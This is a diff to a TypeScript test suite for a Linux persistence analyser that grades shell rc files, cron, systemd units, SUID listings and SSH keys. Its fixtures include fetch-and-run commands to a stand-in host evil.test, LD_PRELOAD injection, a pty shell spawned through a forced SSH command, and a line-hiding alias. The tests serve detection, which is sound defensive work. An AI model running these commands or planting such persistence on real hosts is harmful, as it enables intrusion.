@@ -292,9 +292,32 @@ describe("shell initialization", () => {
     expect(rc("export HISTFILE=/dev/null")[0].severity).toBe("Medium");
   });
 
-  it("reports an alias that redefines a common command", () => {
+  // Ubuntu's own /etc/skel/.bashrc ships these uncommented. A rule that fires on the NAME produced
+  // two Medium events for every home directory on every Debian-family host.
+  it("says nothing about the aliases every Linux host and every developer Mac ships", () => {
+    for (const line of [
+      "alias ls='ls --color=auto'",
+      "alias grep='grep --color=auto'",
+      "alias ll='ls -alF'",
+      "alias cat='bat'",
+      "alias top='htop'",
+      "alias du='dust'",
+      "alias vim=nvim",
+    ]) {
+      expect(rc(line), line).toEqual([]);
+    }
+  });
+
+  it("reports an alias that hides lines from an enumeration command", () => {
     const [s] = rc("alias ls='ls --color=auto | grep -v .x'");
-    expect(s.mitre).toEqual(["T1036"]);
+    expect(s.mitre).toEqual(["T1564"]);
+    expect(s.reason).toContain("REMOVES lines");
+  });
+
+  it("reports an alias whose body is a payload", () => {
+    const [s] = rc("alias sudo='curl -s http://evil.test/a | sh'");
+    expect(s.severity).toBe("High");
+    expect(s.mitre).toContain("T1546.004");
   });
 
   it("says nothing about an ordinary profile", () => {
@@ -428,5 +451,186 @@ describe("analyzeLinuxCollection", () => {
 
   it("ignores an artifact class it does not read", () => {
     expect(analyzeLinuxCollection([file("/var/log/syslog", "anything")])).toEqual([]);
+  });
+});
+
+// Every one of these was a real defect found in review, reproduced against a real host's files.
+describe("regressions", () => {
+  const suid = (body: string) => gradeSuid(file("suid.txt", body), {});
+
+  // A stock Ubuntu host has one setuid binary per snap revision and one per container layer.
+  // Dozens to hundreds of High rows, which then filled the cap and evicted the real findings.
+  it("says nothing about a distribution binary inside a snap or container layer", () => {
+    for (const path of [
+      "/snap/core22/1122/usr/bin/sudo",
+      "/snap/core20/2015/usr/bin/su",
+      "/var/lib/docker/overlay2/9f3c/diff/usr/bin/mount",
+      "/var/lib/containers/storage/overlay/aa/diff/usr/bin/passwd",
+      "/nix/store/abc123-shadow-4.13/bin/su",
+    ]) {
+      expect(suid(`-rwsr-xr-x 1 root root 100 Jan  1 10:00 ${path}`), path).toEqual([]);
+    }
+  });
+
+  it("still reports an implant inside a container layer", () => {
+    expect(suid("/var/lib/docker/overlay2/9f3c/diff/usr/bin/python3.11")[0].severity).toBe("High");
+    expect(suid("/snap/core22/1122/tmp/rootme")[0].severity).toBe("High");
+  });
+
+  // The cross-file findings ran after the per-file loop, so the signal cap evicted them.
+  it("keeps the shared-key finding when a host produces hundreds of SUID rows", () => {
+    const noise = Array.from({ length: 400 }, (_v, i) => `/srv/app-${i}/helper`).join("\n");
+    const signals = analyzeLinuxCollection([
+      file("suid.txt", noise),
+      file("/root/.ssh/authorized_keys", "ssh-rsa SHARED ops@jump"),
+      file("/home/bob/.ssh/authorized_keys", "ssh-rsa SHARED ops@jump"),
+    ]);
+    expect(signals.some((s) => s.reason.includes("The same SSH key authorises"))).toBe(true);
+  });
+
+  // /usr/local/bin/backup.sh >> /tmp/backup.log runs from /usr/local/bin. /tmp is a log target.
+  it("does not claim a job runs from a world-writable directory it only writes to", () => {
+    const [s] = gradeCron(
+      file("/etc/crontab", "*/5 * * * * root /usr/local/bin/backup.sh >> /tmp/backup.log 2>&1"),
+      {},
+    );
+    expect(s.severity).toBe("Medium");
+    expect(s.reason).toContain("references a world-writable directory");
+    expect(s.reason).not.toContain("runs from a world-writable");
+  });
+
+  it("still says a job runs from one when the program itself is there", () => {
+    const [s] = gradeCron(file("/etc/crontab", "*/5 * * * * root /tmp/.x/run.sh"), {});
+    expect(s.severity).toBe("High");
+    expect(s.reason).toContain("runs from a world-writable");
+  });
+
+  // PATH="$PATH:/home/x" appends. Two graders skipped the expansion and reported the opposite.
+  it("expands $PATH in an environment file and a crontab, as the shell grader does", () => {
+    expect(gradeEnv(file("/etc/environment", 'PATH="$PATH:/home/deploy/bin"'), {})).toEqual([]);
+    expect(gradeCron(file("/etc/crontab", "PATH=$PATH:/opt/tools/bin\n"), {})).toEqual([]);
+  });
+
+  // ~/.local/bin is created by `pip install --user` and prepended by Ubuntu's stock .profile.
+  it("says nothing about the user bin directories every distribution creates", () => {
+    for (const dir of [
+      "/home/alice/.local/bin",
+      "/home/alice/.cargo/bin",
+      "/home/alice/.nvm/versions/node/bin",
+    ]) {
+      expect(gradePathEntries([dir, "/usr/bin", "/bin"]), dir).toBeNull();
+    }
+    expect(gradePathEntries(["/home/alice/.hidden/bin", "/usr/bin"])?.severity).toBe("Medium");
+  });
+
+  // ~/.local/share/systemd/user is a user unit and never runs as root.
+  it("does not call a user unit a system-wide root service", () => {
+    expect(
+      gradeUnit(
+        file(
+          "/home/alice/.local/share/systemd/user/syncthing.service",
+          "[Service]\nExecStart=/home/alice/bin/syncthing",
+        ),
+        {},
+      ),
+    ).toEqual([]);
+  });
+
+  // ExecStopPost runs on every failure — for a unit that fails on purpose, a reliable trigger.
+  it("reads every systemd key that runs something, not only ExecStart", () => {
+    for (const key of ["ExecStop", "ExecStopPost", "ExecReload"]) {
+      const [s] = gradeUnit(
+        file("/etc/systemd/system/x.service", `[Service]\nExecStart=/usr/bin/true\n${key}=/tmp/.x/agent`),
+        {},
+      );
+      expect(s?.severity, key).toBe("High");
+    }
+  });
+
+  it("reads a preload set through Environment=", () => {
+    const [s] = gradeUnit(
+      file(
+        "/etc/systemd/system/x.service",
+        "[Service]\nExecStart=/usr/bin/true\nEnvironment=LD_PRELOAD=/tmp/evil.so",
+      ),
+      {},
+    );
+    expect(s?.severity).toBe("High");
+  });
+
+  // Every EC2, Debian and RHEL cloud image ships this exact shape.
+  it("does not call cloud-init's neutered root key a shared key", () => {
+    const forced =
+      'command="echo \'Please login as the user \\"ubuntu\\" rather than the user \\"root\\".\';echo;sleep 10;exit 142"';
+    expect(
+      crossAccountKeyReuse(
+        [
+          file("/root/.ssh/authorized_keys", `${forced} ssh-rsa LAUNCHKEY launch@aws`),
+          file("/home/ubuntu/.ssh/authorized_keys", "ssh-rsa LAUNCHKEY launch@aws"),
+        ],
+        {},
+      ),
+    ).toEqual([]);
+  });
+
+  it("still reports a genuinely shared root key", () => {
+    expect(
+      crossAccountKeyReuse(
+        [
+          file("/root/.ssh/authorized_keys", "ssh-rsa SHARED ops@jump"),
+          file("/home/bob/.ssh/authorized_keys", "ssh-rsa SHARED ops@jump"),
+        ],
+        {},
+      )[0].severity,
+    ).toBe("High");
+  });
+
+  it("reports a preload set through an authorized key's environment option", () => {
+    const [s] = gradeAuthorizedKeys(
+      file("/home/svc/.ssh/authorized_keys", 'environment="LD_PRELOAD=/tmp/evil.so" ssh-rsa AAAA x@y'),
+      {},
+    );
+    expect(s.severity).toBe("High");
+    expect(s.mitre).toContain("T1574.006");
+  });
+
+  it("reports a forced command that spawns a shell through an interpreter", () => {
+    const [s] = gradeAuthorizedKeys(
+      file(
+        "/home/svc/.ssh/authorized_keys",
+        `command="python3 -c 'import pty;pty.spawn(\\"/bin/sh\\")'" ssh-rsa AAAA x@y`,
+      ),
+      {},
+    );
+    expect(s.severity).toBe("High");
+  });
+
+  // A payload piped into python or perl is the same technique as one piped into sh.
+  it("sees a fetch piped into an interpreter other than a shell", () => {
+    for (const cmd of [
+      "curl -s http://evil.test/a | python3 -",
+      "wget -qO- http://evil.test/a | perl",
+      "curl -s http://evil.test/a | node",
+    ]) {
+      expect(judgePayload(cmd).fetchExec, cmd).toBe(true);
+    }
+  });
+
+  // 40,000 characters took 1.8 seconds in one call; a collected crontab took 24 SECONDS.
+  it("bounds the work on a pathological command line", () => {
+    const started = Date.now();
+    for (const cmd of [`nc -${"e".repeat(40_000)}`, `python -c ${"urlopen ".repeat(20_000)}`]) {
+      judgePayload(cmd);
+    }
+    expect(Date.now() - started).toBeLessThan(500);
+  });
+
+  // /etc/cron.daily holds plain scripts run by run-parts, and nothing in them was ever read.
+  it("reads the run-parts drop directories", () => {
+    expect(classifyLinuxArtifact("/etc/cron.daily/backup")).toBe("shellrc");
+    const signals = analyzeLinuxCollection([
+      file("/etc/cron.daily/backup", "curl -s http://evil.test/a | sh"),
+    ]);
+    expect(signals[0].severity).toBe("High");
   });
 });
